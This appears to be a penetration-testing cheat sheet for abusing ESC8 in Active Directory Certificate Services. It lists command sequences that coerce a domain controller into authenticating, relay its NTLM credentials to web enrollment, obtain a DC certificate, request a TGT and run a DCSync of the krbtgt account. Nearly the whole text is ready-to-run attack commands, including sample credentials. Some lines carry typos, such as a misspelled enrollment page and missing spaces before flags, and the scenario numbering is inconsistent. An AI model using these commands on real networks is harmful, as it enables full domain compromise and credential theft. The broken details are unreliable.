# General Overview: 
AD CS supports several HTTP-based enrollment methods if additional server roles are installed (Certificate enrollment web service). There are three methods that can test to abuse this technique.

An attacker can use PetitPotam to force a Domain Controller to relay its NTLM credentials to a target host. These credentials can then be forwarded to the Active Directory Certificate Services (AD CS) Web Enrollment pages, allowing the attacker to enroll for a Domain Controller certificate. This certificate can be used to request a Ticket Granting Ticket (TGT), enabling a Pass-the-Ticket attack that compromises the entire domain.

# # Abusing ESC8 Certificate Templates

## Scenario 1 (Certipy, NTLMrelayx, PetitPotman):
- certipy-ad relay -ca 172.21.1.1
- impacket-ntlmrelayx -t http://megacorpone.com/certsrv/csertfnsh.asp -smb2support --adcs --template 'Domain Controller'
- python3 PetitPotam -d megacorpone.com -u afsimmons -p Spawn123! 172.21.1.5 MEGACORP
## Scenario 2: 
- impacket-ntlmrelayx -t http://megacorpone.com/certsrv/csertfnsh.asp -smb2support --adcs --template 'Domain Controller'
- mimikatz> misc::efs /server:dc.lab.local /connect:172.21.1.5 /noauth
-  kekeo> base64 /input:on
- kekeo> tgt::ask /pfx:"BASE64-CERT-FROM-NTLMRELAY" /user:dc$ /domain:megacorpone.com /ptt
- mimikatz> lsadump::dcsync /user:krbtgt
## Scenario 4:
- sudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine
- sudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v
## Scenario 5:
- Source: https://github.com/bats3c/ADCSPwn
- adcspwn.exe --adcs "cs server" --port [local port] --remote [computer]
- adcspwn.exe --adcs cs.megacorpone.com
- adcspwn.exe --adcs cs.megacorpone.com--remote dc.megacorpone.com--port 9001
- adcspwn.exe --adcs cs.megacorpone.com--remote dc.megacorpone.com --output C:\Temp\cert_b64.txt
- adcspwn.exe --adcs cs.megacorpone.com--remote dc.megacorpone.com--username megacorpone.com\afsimmons --password Spawn123! --dc dc.megacorpone.com
## Scenario 6: 
 - impacket-ntlmrelayx -t http://megacorpone.com/certsrv/csertfnsh.asp -smb2support --adcs --template 'Domain Controller'
 - python3 coercer.py <DC_IP> <YOUR_IP>
 - python3 getTGT.py -dc-ip <DC_IP> -pfx <CERT_FILE.pfx> -no-pass